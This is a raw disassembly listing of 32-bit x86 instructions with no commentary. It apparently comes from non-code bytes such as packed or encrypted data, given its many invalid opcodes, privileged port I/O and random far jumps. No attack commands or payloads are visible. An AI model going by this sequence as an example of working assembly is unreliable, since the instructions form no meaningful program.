  412ea6:	xchg   esp,eax
  412ea7:	cmp    eax,0xcc8dc1cf
  412eac:	push   edx
  412ead:	xchg   DWORD PTR [edi],eax
  412eaf:	outs   dx,BYTE PTR ds:[esi]
  412eb0:	inc    ecx
  412eb1:	push   es
  412eb2:	stos   BYTE PTR es:[edi],al
  412eb3:	ficomp DWORD PTR [esi-0xb4eabab]
  412eb9:	ss mov bh,0x21
  412ebc:	in     eax,dx
  412ebd:	fld    DWORD PTR [bx+si+0x30]
  412ec1:	imul   BYTE PTR [esp+ecx*8+0x4f4c51ec]
  412ec8:	sub    dl,BYTE PTR [esp+edx*4-0x213ef9a7]
  412ecf:	push   ds
  412ed0:	inc    esi
  412ed1:	pusha  
  412ed2:	jge    0x412f53
  412ed4:	mov    ds:0xb96ffdb0,eax
  412ed9:	fdiv   QWORD PTR [ebp-0x5e]
  412edc:	in     al,dx
  412edd:	add    ah,BYTE PTR ss:[edx-0x742c6340]
  412ee4:	(bad)  
  412ee6:	inc    edx
  412ee7:	cmp    cl,0xe2
  412eea:	in     eax,0x49
  412eec:	add    DWORD PTR fs:[ecx-0x2cc169eb],ebx
  412ef3:	or     ebx,DWORD PTR ds:0x96ba8f3b
  412ef9:	or     BYTE PTR [ecx-0x1aa0c5e9],bl
  412eff:	pop    ecx
  412f00:	adc    BYTE PTR [ecx+edx*1],0x35
  412f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f05:	leave  
  412f06:	dec    edi
  412f07:	in     eax,0xbe
  412f09:	xrstor [esp+edx*2-0x41]
  412f0e:	xchg   edi,eax
  412f0f:	pop    esi
  412f10:	mov    ds:0xb008ae3,al
  412f15:	sub    eax,0x3cfe5bfe
  412f1a:	out    dx,eax
  412f1b:	test   al,0x66
  412f1d:	xor    bl,ah
  412f1f:	jno    0x412f80
  412f21:	inc    eax
  412f22:	inc    ecx
  412f23:	sub    edi,DWORD PTR [ebx-0x66]
  412f26:	dec    eax
  412f27:	dec    edi
  412f28:	and    BYTE PTR [edi],dl
  412f2a:	jmp    0x412ed5
  412f2c:	and    al,BYTE PTR [edi]
  412f2e:	push   ds
  412f2f:	xchg   ebx,eax
  412f30:	push   edx
  412f31:	sub    ebx,DWORD PTR [ecx+0x4b]
  412f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f35:	sub    al,0x70
  412f37:	dec    esp
  412f38:	sub    eax,0xc8253a73
  412f3d:	mov    edx,0x105dbd40
  412f42:	outs   dx,BYTE PTR ds:[esi]
  412f43:	inc    ebx
  412f44:	mov    ebp,0x42777e09
  412f49:	and    DWORD PTR [eax-0x3adc0e63],esp
  412f4f:	pushf  
  412f50:	xor    esp,DWORD PTR [esi+0x2e]
  412f53:	iret   
  412f54:	jecxz  0x412ef3
  412f56:	loope  0x412f06
  412f58:	arpl   di,si
  412f5a:	fimul  WORD PTR [esi]
  412f5c:	jbe    0x412f28
  412f5e:	pop    ecx
  412f5f:	mov    ds:0xeeed2954,eax
  412f64:	loop   0x412f2a
  412f66:	pop    ss
  412f67:	loope  0x412f3f
  412f69:	push   es
  412f6a:	xlat   BYTE PTR ds:[ebx]
  412f6b:	xor    eax,0x2fdb10c8
  412f70:	fldenv [edi]
  412f72:	adc    al,0x43
  412f74:	cmp    BYTE PTR ds:0x9766d825,dh
  412f7a:	xor    DWORD PTR [esp+esi*2+0x23],esp
  412f7e:	or     eax,0x764fcd45
  412f83:	pop    ebx
  412f84:	sub    esi,edi
  412f86:	out    dx,al
  412f87:	push   eax
  412f88:	or     DWORD PTR [eax],ebx
  412f8a:	add    eax,0x96758e40
  412f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f90:	loop   0x412f60
  412f92:	add    ebp,DWORD PTR [esi+0x20]
  412f95:	pop    esp
  412f97:	mov    bl,0x40
  412f99:	adc    dl,BYTE PTR [edx+0x3ea571]
  412f9f:	or     BYTE PTR [edi+0x3c],dh
  412fa2:	sub    DWORD PTR [ebx+eiz*2+0x597aefdf],0x3a
  412faa:	daa    
  412fab:	test   al,0x65
  412fad:	lods   al,BYTE PTR ds:[esi]
  412fae:	stos   DWORD PTR es:[edi],eax
  412faf:	scas   al,BYTE PTR es:[edi]
  412fb0:	cmp    edx,DWORD PTR [ebp+eiz*8-0x634b53b0]
  412fb7:	mov    ds:0xa732ba59,al
  412fbc:	fidivr DWORD PTR [ebx]
  412fbe:	jnp    0x41302e
  412fc0:	fst    QWORD PTR [ecx+eax*8]
  412fc3:	scas   eax,DWORD PTR es:[edi]
  412fc4:	fidivr DWORD PTR [esi+0x57]
  412fc7:	rcl    DWORD PTR [ebp+0x21],0xa2
  412fcb:	fild   WORD PTR [edx-0x1fdb1b82]
  412fd1:	sbb    al,0xdf
  412fd3:	stos   BYTE PTR es:[edi],al
  412fd4:	out    dx,eax
  412fd5:	sbb    bl,BYTE PTR [edi-0x1a]
  412fd8:	popf   
  412fd9:	clc    
  412fda:	add    al,0xea
  412fdc:	mov    ebp,0xc117c640
  412fe1:	xor    dl,BYTE PTR [ebp-0x49]
  412fe4:	push   0x5a
  412fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fe7:	adc    DWORD PTR [esi+0xb060eab],esp
  412fed:	mov    ds:0x3e59ef25,eax
  412ff2:	enter  0x2090,0xb9
  412ff6:	cli    
  412ff7:	or     eax,esp
  412ff9:	or     DWORD PTR [eax+0x2b217948],eax
  412fff:	sbb    ecx,eax
  413001:	ins    DWORD PTR es:[edi],dx
  413002:	sub    ebx,eax
  413004:	mov    al,ds:0xf5a37aa7
  413009:	push   edi
  41300a:	pop    edi
  41300b:	and    ch,BYTE PTR [edi-0x18]
  41300e:	fisub  DWORD PTR [esi-0x64dbccbf]
  413014:	push   DWORD PTR [esi+0x6e]
  413017:	mov    esi,0x1d0186a1
  41301c:	lahf   
  41301d:	sub    DWORD PTR [ebp-0x3a],ecx
  413020:	lea    esp,[ebp+0xde5f2f7]
  413026:	xchg   edx,eax
  413027:	hlt    
  413028:	push   cs
  413029:	clc    
  41302a:	xor    ecx,DWORD PTR [edx+0x8c12f19]
  413030:	add    dh,BYTE PTR [esi]
  413032:	ret    0xab2b
  413035:	out    0x4e,eax
  413037:	aam    0xe
  413039:	lahf   
  41303a:	cs daa 
  41303c:	loop   0x41305e
  41303e:	mov    ecx,0x8b8aef7b
  413043:	fisttp DWORD PTR [edx]
  413045:	mov    esp,0xc5a7e24c
  41304a:	sub    DWORD PTR [edx],ebp
  41304c:	popf   
  41304d:	arpl   WORD PTR fs:0xcb85dfca,di
  413054:	xor    al,0xe0
  413056:	add    BYTE PTR [esi-0x24],cl
  413059:	hlt    
  41305a:	out    dx,eax
  41305b:	scas   al,BYTE PTR es:[edi]
  41305c:	jmp    0x27d0:0xe600cf12
  413063:	test   BYTE PTR [ebp-0x1bafad69],bl
  413069:	imul   ebp,esp,0x3f9a8029
  41306f:	or     esp,esi
  413071:	hlt    
  413072:	nop    DWORD PTR [ecx+0x6e]
  413076:	cmp    DWORD PTR [ebx],eax
  413078:	jo     0x412ffa
  41307a:	popa   
  41307b:	and    al,0x15
  41307d:	ja     0x413087
  41307f:	push   edx
  413080:	push   ss
  413081:	fsub   DWORD PTR [edx-0x7b1150b3]
  413087:	inc    edi
  413088:	sub    ecx,ebp
  41308a:	sbb    eax,0x488126a
  41308f:	out    dx,eax
  413090:	jmp    0xd843:0x3935bdfc
  413097:	cmp    bh,bl
  413099:	add    al,0x26
  41309b:	mulps  xmm4,XMMWORD PTR [ebx-0x5037cf6]
  4130a2:	mov    bh,0x81
  4130a4:	cmp    BYTE PTR [edx-0x49],dh
  4130a7:	lea    eax,[eax-0xd]
  4130aa:	jg     0x413082
  4130ac:	loope  0x413064
  4130ae:	cwde   
  4130af:	loop   0x4130bf
  4130b1:	mov    WORD PTR [ecx+0x18005d70],ds
  4130b7:	gs pop es
  4130b9:	and    BYTE PTR [ebp+0x49efc06f],0xf2
  4130c0:	push   cs
  4130c1:	ins    BYTE PTR es:[edi],dx
  4130c2:	jns    0x4130b5
  4130c4:	and    eax,0x4d832a33
  4130c9:	mov    es,WORD PTR [ebp+0x26]
  4130cc:	push   ebp
  4130cd:	lds    eax,FWORD PTR [ebx]
  4130cf:	int3   
  4130d0:	jnp    0x4130ae
  4130d2:	jo     0x41309b
  4130d4:	and    DWORD PTR [eax],0x3cc67fac
  4130da:	jmp    0x41309e
  4130dc:	add    eax,0x3f908519
  4130e1:	xchg   esp,eax
  4130e2:	xchg   dl,bh
  4130e4:	cmc    
  4130e5:	out    dx,eax
  4130e6:	fs loop 0x41308e
  4130e9:	retf   
  4130ea:	xor    al,0x81
  4130ec:	cmp    ch,BYTE PTR [esi+0x11f5bc49]
  4130f2:	pushf  
  4130f3:	cmp    eax,0x6ff3d6c2
  4130f8:	adc    DWORD PTR [ebx],ebp
  4130fa:	std    
  4130fb:	xchg   esi,eax
  4130fc:	je     0x413132
  4130fe:	jp     0x4130a6
  413100:	gs and eax,0xc7d607f9
  413106:	add    DWORD PTR [esi],edi
  413108:	adc    al,0x77
  41310a:	pop    esp
  41310b:	sbb    eax,0x6eff703b
  413110:	dec    esp
  413111:	adc    al,BYTE PTR [ebp-0x190fb55c]
  413117:	imul   edx,DWORD PTR [ecx+0x14],0x40
  41311b:	clc    
  41311c:	stc    
  41311d:	or     BYTE PTR [esi-0x11],cl
  413120:	jl     0x4130bb
  413122:	arpl   ax,cx
  413124:	ja     0x4130c6
  413126:	push   edx
  413127:	dec    ecx
  413128:	mov    bh,BYTE PTR [ebp+0x1a029b8b]
  41312e:	jge    0x4130e9
  413130:	inc    eax
  413131:	out    0xa4,eax
  413133:	test   DWORD PTR [ecx+0x15],ebx
  413136:	inc    esp
  413137:	and    eax,0xfe5ffec3
  41313c:	jnp    0x4131a3
  41313e:	fidivr WORD PTR [esi-0x24f69f76]
  413144:	leave  
  413145:	xchg   ebp,eax
  413146:	mov    ds:0x4a8a0f70,eax
  41314b:	xchg   ecx,eax
  41314c:	popa   
  41314d:	sub    DWORD PTR [eax-0x78da5f82],eax
  413153:	rol    BYTE PTR [ebx+0x6741e658],1
  413159:	push   edx
  41315a:	imul   edx,DWORD PTR [edi+0x38ac0c49],0xfffffff3
  413161:	fidivr DWORD PTR [ebp+0x1ea8a8c5]
  413167:	retf   0xc15a
  41316a:	sub    eax,0x63646718
  41316f:	pop    es
  413170:	dec    ecx
  413171:	mov    ds:0x7ffecc2,eax
  413176:	mov    ds:0xb53e663c,eax
  41317b:	add    dl,BYTE PTR [ecx]
  41317d:	xor    eax,0x4666fbd1
  413182:	ret    0xa692
  413185:	pop    eax
  413186:	mov    ch,0x70
  413188:	fs xchg edx,eax
  41318a:	aaa    
  41318b:	ret    
  41318c:	xlat   BYTE PTR ds:[ebx]
  41318d:	xor    DWORD PTR [edi],ebx
  41318f:	in     al,0x92
  413191:	mov    eax,ds:0x596558ee
  413196:	xchg   esi,eax
  413197:	mov    al,ds:0x9a3a9455
  41319c:	out    dx,eax
  41319d:	dec    ecx
  41319e:	pop    eax
  41319f:	or     DWORD PTR [esi],ecx
  4131a1:	xchg   ebx,eax
  4131a2:	not    DWORD PTR [ebp+0x51]
  4131a5:	inc    esp
  4131a6:	push   esp
  4131a7:	jle    0x41316d
  4131a9:	repz inc edi
  4131ab:	mov    DWORD PTR [ecx+0x4d4d6a20],ebx
  4131b1:	cmc    
  4131b2:	push   ebx
  4131b3:	(bad)  
  4131b4:	into   
  4131b5:	popf   
  4131b6:	(bad)  gs:[eax]
  4131b9:	cmp    eax,0x13141267
  4131be:	push   ss
  4131bf:	fcmovbe st,st(5)
  4131c1:	das    
  4131c2:	scas   eax,DWORD PTR es:[edi]
  4131c3:	push   ss
  4131c4:	pop    ds
  4131c5:	adc    DWORD PTR [esi+0x54ae27e1],ebp
  4131cb:	jmp    0xd7d5dd3a
  4131d0:	xchg   ebp,eax
  4131d1:	jbe    0x41315b
  4131d3:	pop    esp
  4131d4:	ins    BYTE PTR es:[edi],dx
  4131d5:	dec    ebp
  4131d6:	jbe    0x413164
  4131d8:	cmc    
  4131d9:	retf   0x534b
  4131dc:	mov    ch,0x8a
  4131de:	xor    BYTE PTR [esi],ah
  4131e0:	sbb    dh,BYTE PTR [eax+0x4e]
  4131e3:	ret    
  4131e4:	dec    esp
  4131e5:	mov    esi,0xead3b603
  4131ea:	loopne 0x41317b
  4131ec:	sar    BYTE PTR [edx+0x39],cl
  4131ef:	adc    bl,al
  4131f1:	popf   
  4131f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131f3:	outs   dx,BYTE PTR ds:[esi]
  4131f4:	push   ecx
  4131f5:	and    esp,DWORD PTR [edx+0x75029a3e]
  4131fb:	lahf   
  4131fc:	and    DWORD PTR [edi+0xb],ebp
  4131ff:	nop
  413200:	mov    eax,0x449e0ae2
  413205:	add    DWORD PTR [edx-0xfb1043d],0xc1ec71d5
  41320f:	inc    edi
  413210:	lods   al,BYTE PTR ds:[esi]
  413211:	aam    0x3d
  413213:	scas   eax,DWORD PTR es:[edi]
  413214:	in     eax,0x9d
  413216:	fstp   TBYTE PTR [ebx-0x2044b3a8]
  41321c:	daa    
  41321d:	mov    dh,0xb6
  41321f:	add    DWORD PTR [eax+0x46],edx
  413222:	dec    eax
  413223:	test   DWORD PTR [ebx],ebx
  413225:	sub    al,0x33
  413227:	xchg   edx,eax
  413228:	sub    DWORD PTR [eax+0x45],edi
  41322b:	cmp    DWORD PTR [esi-0x79],ecx
  41322e:	ror    BYTE PTR [ebx+0x4170a212],1
  413234:	and    eax,0xd384d2cc
  413239:	inc    ecx
  41323a:	jno    0x41324a
  41323c:	pop    esi
  41323d:	and    al,0x1e
  41323f:	pop    ebx
  413240:	fs add eax,0x38dd1767
  413246:	push   ebp
  413247:	outs   dx,DWORD PTR ds:[esi]
  413248:	adc    DWORD PTR [ebx-0x1a16d8b0],edi
  41324e:	pusha  
  41324f:	and    edx,DWORD PTR [edx+eax*2+0x3a995692]
  413256:	stos   DWORD PTR es:[edi],eax
  413257:	lahf   
  413258:	xor    esp,DWORD PTR [ebp-0x9]
  41325b:	pop    eax
  41325c:	cmp    esp,DWORD PTR [edx-0x2c]
  41325f:	(bad)  {k4}{z}
  413264:	push   eax
  413265:	out    0xc8,eax
  413267:	xor    DWORD PTR [eax+ecx*1+0x33f36f6f],0x38
  41326f:	mov    esp,0xd50893a2
  413274:	shl    bl,1
  413276:	mov    cl,0x5f
  413278:	into   
  413279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41327a:	fisub  DWORD PTR ds:0xf17a8050
  413280:	pop    esi
  413281:	pop    ebx
  413282:	cmp    al,0x62
  413284:	xor    DWORD PTR [eax-0x26],eax
  413287:	pop    esi
  413288:	jb     0x41322a
  41328a:	sahf   
  41328b:	cmp    eax,esi
  41328d:	xchg   ecx,eax
  41328e:	sbb    esi,DWORD PTR [ecx-0x7]
  413291:	mov    edi,0xb06fb116
  413296:	sbb    al,0x1a
  413298:	jmp    0x77aaf14b
  41329d:	popf   
  41329e:	jl     0x41324e
  4132a0:	adc    DWORD PTR [edx],0x4b6a160d
  4132a6:	aad    0xc5
  4132a8:	or     BYTE PTR [edi+0x1355fea7],0xde
  4132af:	ror    DWORD PTR [eax-0x22ffec84],0x4c
  4132b6:	loop   0x4132d4
  4132b8:	or     cl,ah
  4132ba:	dec    BYTE PTR [edi+0x1a]
  4132bd:	mov    ch,0xd8
  4132bf:	lds    eax,FWORD PTR [esi+edx*2]
  4132c2:	sub    al,0xcd
  4132c4:	or     ah,BYTE PTR [ecx+eiz*1-0x2e161f3c]
  4132cb:	aad    0xd7
  4132cd:	retf   0x3886
  4132d0:	in     al,0x15
  4132d2:	frstor [esp+ecx*2-0x35]
  4132d6:	push   ds
  4132d7:	inc    ebx
  4132d8:	mov    eax,0x98042384
  4132dd:	xor    al,0x2c
  4132df:	jg     0x413284
  4132e1:	push   ebp
  4132e2:	arpl   WORD PTR [ecx],si
  4132e4:	sbb    eax,0x260e323
  4132e9:	mov    ds:0xb945f514,eax
  4132ee:	inc    ecx
  4132ef:	add    edi,ebp
  4132f1:	inc    eax
  4132f2:	out    dx,al
  4132f3:	pop    ds
  4132f4:	dec    DWORD PTR [ebx+0x70]
  4132f7:	sub    BYTE PTR [ebx-0x585ebd84],dl
  4132fd:	rcr    al,cl
  4132ff:	pop    edx
  413300:	and    BYTE PTR [eax-0x5c],ch
  413303:	(bad)  
  413304:	cmp    al,0x4f
  413306:	or     edi,DWORD PTR [ebx-0x14d44ef5]
  41330c:	xchg   DWORD PTR [ebp-0x490e3be2],edx
  413312:	cwde   
  413313:	cmovns ecx,DWORD PTR gs:[edi]
  413317:	inc    ecx
  413318:	mov    ds:0x9e04bb24,eax
  41331d:	pop    ds
  41331e:	inc    esi
  41331f:	dec    esi
  413320:	iret   
  413321:	xor    edi,ecx
  413323:	inc    ebp
  413324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413325:	dec    ebp
  413326:	mov    al,0x78
  413328:	pop    ss
  413329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41332a:	daa    
  41332b:	sub    eax,0xe3a1a2f8
  413330:	(bad)  
  413331:	sbb    DWORD PTR [eax],eax
  413333:	pop    ebx
  413334:	dec    esp
  413335:	adc    BYTE PTR ds:0x2bbd2d9b,bh
  41333b:	sub    al,0x27
  41333d:	mov    ds:0x8959aac3,al
  413342:	sbb    eax,DWORD PTR ds:0xbf4feeeb
  413348:	add    DWORD PTR [esp+edx*8],0x2db6080
  41334f:	cmp    DWORD PTR ds:0x7f7c0dda,0xb043cb55
  413359:	jg     0x413386
  41335b:	mov    ebx,0x373f19ee
  413360:	cld    
  413361:	icebp  
  413362:	call   0x6dc0f57f
  413367:	ficomp DWORD PTR [ebx+0x1b]
  41336a:	jge    0x4133ad
  41336c:	jnp    0x4133e9
  41336e:	and    BYTE PTR [ebx-0x3db7d95d],al
  413374:	(bad)  
  413375:	mov    WORD PTR cs:[ebx+0x562193d2],ss
  41337c:	pop    es
  41337d:	add    cl,BYTE PTR [edi]
  41337f:	sub    al,0x4e
  413381:	sub    ecx,esi
  413383:	sub    DWORD PTR [ebp+0x3db5317a],0x54
  41338a:	sub    eax,0x19b9d156
  41338f:	push   esi
  413390:	pusha  
  413391:	xlat   BYTE PTR ds:[ebx]
  413392:	push   cs
  413393:	mov    ecx,0x8eeaef05
  413398:	xor    esp,DWORD PTR [ecx-0x62ce51b2]
  41339e:	cmc    
  41339f:	jl     0x413325
  4133a1:	add    dh,0xc4
  4133a4:	cmc    
  4133a5:	sbb    eax,DWORD PTR [ecx-0x7cdd4587]
  4133ab:	dec    ebx
  4133ac:	xchg   edi,eax
  4133ad:	jno    0x4133a5
  4133af:	mov    eax,0xaded1e93
  4133b4:	add    ch,BYTE PTR [ebp+0x7d4c398]
  4133ba:	xchg   esp,eax
  4133bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133bc:	inc    ebx
  4133bd:	test   DWORD PTR [eax+0x309512b9],eax
  4133c3:	sbb    edi,DWORD PTR [esi]
  4133c5:	inc    esi
  4133c6:	xchg   edx,eax
  4133c7:	int    0x5e
  4133c9:	std    
  4133ca:	gs xchg ebx,eax
  4133cc:	jmp    0x9850012c
  4133d1:	fdiv   st,st(7)
  4133d3:	jb     0x413360
  4133d5:	scas   al,BYTE PTR es:[edi]
  4133d6:	or     ecx,eax
  4133d8:	push   ebx
  4133d9:	push   es
  4133da:	clc    
  4133db:	xor    eax,0xe5be0065
  4133e0:	shr    DWORD PTR [edx+ebx*4+0x75],0x7f
  4133e5:	xor    al,0x49
  4133e7:	xchg   edi,eax
  4133e8:	or     bh,BYTE PTR [esi-0x35]
  4133eb:	mov    edi,0xcdaa7555
  4133f0:	xchg   BYTE PTR [ebx-0x17f506b5],ah
  4133f6:	nop    DWORD PTR [eax+ebx*2]
  4133fa:	mov    esi,0x147ded6e
  4133ff:	push   esp
  413400:	adc    ebp,DWORD PTR [eax]
  413402:	ins    DWORD PTR es:[edi],dx
  413403:	inc    esp
  413404:	cmp    al,0xe1
  413406:	sbb    al,0x5e
  413408:	adc    eax,0xadae890a
  41340d:	push   ebx
  41340e:	ror    BYTE PTR [edx-0xb2c544a],cl
  413414:	inc    edi
  413415:	mov    edx,esp
  413417:	push   ebp
  413418:	je     0x413402
  41341a:	add    al,0x1
  41341c:	mov    ch,0x51
  41341e:	call   0xc5e659f0
  413423:	call   0xf791:0x3071dacf
  41342a:	sub    eax,0x3048564d
  41342f:	xchg   edx,eax
  413430:	jp     0x41345f
  413432:	cmp    esp,DWORD PTR [ebp-0x635da3b]
  413438:	popf   
  413439:	pop    ss
  41343a:	sub    al,0x62
  41343c:	add    DWORD PTR [edi-0x6c],ebp
  41343f:	loope  0x413433
  413441:	mov    ebp,ss
  413443:	mov    edi,DWORD PTR [ecx+0x22]
  413446:	mov    esi,0x702006f6
  41344b:	xchg   edx,eax
  41344c:	dec    DWORD PTR [ebp-0x6c582c5d]
  413452:	cli    
  413453:	cmp    eax,0x23d09618
  413458:	fs pop edx
  41345a:	out    dx,al
  41345b:	sub    al,0xfe
  41345d:	mov    DWORD PTR [ebx],esp
  41345f:	mov    al,0xab
  413461:	test   DWORD PTR [esi+0x278b4785],esi
  413467:	inc    ebx
  413468:	inc    esp
  413469:	adc    dh,BYTE PTR [edi+0x4001049b]
  41346f:	cmp    al,0xb
  413471:	xchg   edi,eax
  413472:	ror    DWORD PTR ds:0x17515389,0x87
  413479:	call   0x12a0bb3c
  41347e:	adc    al,0x7f
  413480:	and    ecx,esi
  413482:	xor    bl,BYTE PTR [esi+0x53a7111]
  413488:	pop    edi
  413489:	call   0xbb8d:0x465577df
  413490:	and    cl,al
  413492:	jle    0x413449
  413494:	adc    esp,ecx
  413496:	jp     0x4134e6
  413498:	mov    eax,ds:0x3da55821
  41349d:	ss mov ah,0x54
  4134a0:	add    DWORD PTR [ecx+ebp*8-0x43a2ff60],ecx
  4134a7:	xor    eax,0xac58f711
  4134ac:	cmp    edx,DWORD PTR [esi]
  4134ae:	mov    eax,0xd70c8e5d
  4134b3:	sbb    ecx,DWORD PTR [edx+edi*8-0x5060f06a]
  4134ba:	popa   
  4134bb:	sub    BYTE PTR [edx],bl
  4134bd:	repnz aad 0xdc
  4134c0:	pop    ebp
  4134c1:	mov    ds:0xf0abe92a,al
  4134c6:	outs   dx,DWORD PTR ds:[esi]
  4134c7:	pusha  
  4134c8:	into   
  4134c9:	inc    esp
  4134ca:	iret   
  4134cb:	fwait
  4134cc:	sbb    BYTE PTR [ebp+ebx*1+0x1e],0x5a
  4134d1:	push   eax
  4134d2:	mov    dl,0x8b
  4134d4:	adc    ch,BYTE PTR [esi+0x2]
  4134d7:	push   es
  4134d8:	sahf   
  4134d9:	push   edi
  4134da:	lods   al,BYTE PTR ds:[esi]
  4134db:	xchg   edx,eax
  4134dc:	inc    ecx
  4134dd:	not    DWORD PTR [esi-0x2d679f41]
  4134e3:	mov    ecx,0x3ffbf84c
  4134e8:	dec    esi
  4134e9:	xchg   cl,al
  4134eb:	retf   0xb209
  4134ee:	push   es
  4134ef:	inc    esp
  4134f0:	cld    
  4134f1:	push   ebp
  4134f2:	jbe    0x4134f7
  4134f4:	div    DWORD PTR [edi-0x4f]
  4134f7:	sbb    cl,BYTE PTR [ebx+0x64af0e6b]
  4134fd:	sub    ch,ch
  4134ff:	mov    ds:0x2fd86b61,eax
  413504:	ss dec edx
  413506:	outs   dx,BYTE PTR ds:[esi]
  413507:	pop    ebx
  413508:	push   eax
  413509:	cwde   
  41350a:	jno    0x41354c
  41350c:	xchg   BYTE PTR [edx+edx*2-0x1a02e8a1],cl
  413513:	int    0x76
  413515:	pop    ebx
  413516:	pop    ebp
  413517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413518:	addr16 int 0x64
  41351b:	daa    
  41351c:	inc    eax
  41351d:	pop    ss
  41351e:	push   0x61
  413520:	mov    cl,0x94
  413522:	je     0x4134b9
  413524:	test   BYTE PTR [edi],0xe9
  413527:	jle    0x41351e
  413529:	test   DWORD PTR [edx],ecx
  41352b:	mov    esp,0x8da835d2
  413530:	add    DWORD PTR [edi+0x47],edx
  413533:	js     0x41358e
  413535:	test   DWORD PTR [ecx],0xfcc94448
  41353b:	shr    DWORD PTR [edx-0x1],1
  41353e:	mov    bl,BYTE PTR [ecx+0x677af1fa]
  413544:	or     esi,DWORD PTR [ebx]
  413546:	cvtps2pd xmm6,QWORD PTR [ebp+0x8408276]
  41354d:	jl     0x4134e8
  41354f:	and    eax,0x94e005e8
  413554:	pop    esi
  413555:	jl     0x4134e2
  413557:	jno    0x4134e5
  413559:	or     BYTE PTR [ebp+0x600950da],ah
  41355f:	dec    ebx
  413560:	mov    BYTE PTR [ebx-0x6e],ch
  413563:	nop
  413564:	(bad)  
  413565:	loop   0x4135e2
  413567:	jecxz  0x413586
  413569:	mov    ah,0xc3
  41356b:	(bad)  [eax+ebp*1+0x2125d449]
  413572:	sub    BYTE PTR [ecx-0x665d419f],bh
  413578:	and    al,0x66
  41357a:	or     BYTE PTR [ecx],bl
  41357c:	sbb    eax,0x687fdc22
  413581:	ret    0x7d9a
  413584:	fwait
  413585:	popa   
  413586:	inc    edx
  413587:	jns    0x41357d
  413589:	and    DWORD PTR [ecx-0x9776266],edi
  41358f:	push   ss
  413590:	(bad)  [ecx+0x49]
  413593:	or     eax,DWORD PTR [esp+edi*1-0x2d]
  413597:	mov    ecx,es
  413599:	cmp    BYTE PTR [ecx-0x25],dl
  41359c:	xchg   ebp,eax
  41359d:	(bad)  
  41359e:	pop    esi
  41359f:	lahf   
  4135a0:	dec    edx
  4135a1:	movhps xmm1,QWORD PTR [eax-0x3b]
  4135a5:	push   0x39
  4135a7:	mov    edx,0xe39ced65
  4135ac:	sqrtps xmm3,xmm1
  4135af:	and    DWORD PTR [ebx+0x34],esp
  4135b2:	(bad)  
  4135b3:	adc    ebx,DWORD PTR [ebx]
  4135b5:	out    0xf4,eax
  4135b7:	cmp    eax,0xa1df1801
  4135bc:	dec    edx
  4135bd:	ds (bad) 
  4135bf:	push   esp
  4135c0:	push   ebp
  4135c1:	pop    eax
  4135c2:	push   ds
  4135c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135c4:	or     ah,BYTE PTR [ebp+ebx*2-0xd5f560c]
  4135cb:	xchg   BYTE PTR [edx],bh
  4135cd:	lods   al,BYTE PTR ds:[esi]
  4135ce:	pop    esp
  4135cf:	rcr    BYTE PTR [esi],0x1d
  4135d2:	adc    al,BYTE PTR ds:0x669f36a7
  4135d8:	jb     0x41361c
  4135da:	push   cs
  4135db:	and    BYTE PTR [edx-0x34bc6cf1],0x60
  4135e2:	pushf  
  4135e3:	call   0x3d139d66
  4135e8:	inc    edi
  4135e9:	dec    esi
  4135ea:	sbb    edx,ecx
  4135ec:	mov    DWORD PTR [ebx+0x21d17b81],esi
  4135f2:	xchg   edx,eax
  4135f3:	jbe    0x41362b
  4135f5:	xchg   ebp,esp
  4135f7:	push   ecx
  4135f8:	jge    0x413626
  4135fa:	pop    edx
  4135fb:	rcr    DWORD PTR [ecx],cl
  4135fd:	clc    
  4135fe:	popf   
  4135ff:	jae    0x4135d9
  413601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413602:	mov    DWORD PTR [ebx-0x7d],esi
  413605:	test   edi,ebx
  413607:	(bad)  
  413608:	mul    BYTE PTR [eax]
  41360a:	test   al,0x26
  41360c:	jg     0x4135ab
  41360e:	test   BYTE PTR [ebp-0x1a11cbb0],cl
  413614:	xchg   DWORD PTR [ebp-0x7fdbf513],esp
  41361a:	jae    0x4135ed
  41361c:	pop    ecx
  41361d:	sar    BYTE PTR [edx+esi*2],cl
  413620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413621:	xchg   esi,eax
  413622:	mov    gs,WORD PTR [edx]
  413624:	xchg   esp,eax
  413625:	dec    eax
  413626:	jns    0x41366a
  413628:	xchg   ecx,eax
  413629:	jbe    0x41366c
  41362b:	pop    ds
  41362c:	jb     0x4136a2
  41362e:	mov    ebx,0xefff80f5
  413633:	ret    0xae20
  413636:	adc    ecx,DWORD PTR [edx+ebx*4]
  413639:	clc    
  41363a:	pop    edi
  41363b:	es es scas eax,DWORD PTR es:[edi]
  41363e:	or     al,0x7a
  413640:	ins    BYTE PTR es:[edi],dx
  413641:	call   0x7119e69b
  413646:	loopne 0x413605
  413648:	pop    esi
  413649:	sub    DWORD PTR [edi],ebp
  41364b:	(bad)
  41364e:	fadd   DWORD PTR [edi-0x56]
  413651:	(bad)  
  413653:	mov    ds:0x312e1d39,eax
  413658:	sub    ebx,ebx
  41365a:	jnp    0x41362e
  41365c:	push   esi
  41365d:	shr    DWORD PTR [edx+0x1fd3b30f],cl
  413663:	dec    eax
  413664:	lock aad 0xdc
  413667:	mov    edx,0x4952fd77
  41366c:	pop    esp
  41366d:	dec    ecx
  41366e:	jne    0x4136ce
  413670:	pop    edx
  413671:	adc    DWORD PTR [edx],0xffffff84
  413674:	add    al,0xfc
  413676:	xor    dh,al
  413678:	dec    esp
  413679:	test   BYTE PTR [eax],bh
  41367b:	push   ss
  41367c:	mov    ah,ah
  41367e:	les    ebx,FWORD PTR [ecx+esi*4]
  413681:	lods   eax,DWORD PTR ds:[esi]
  413682:	xor    al,0x2a
  413684:	mov    esi,eax
  413686:	mov    WORD PTR [ebx+0x481bfbf3],gs
  41368c:	jg     0x41362a
  41368e:	push   edx
  41368f:	(bad)  
  413690:	mov    eax,ds:0x3b49eeb4
  413695:	push   eax
  413696:	jns    0x413686
  413698:	cli    
  413699:	mov    ss,ebp
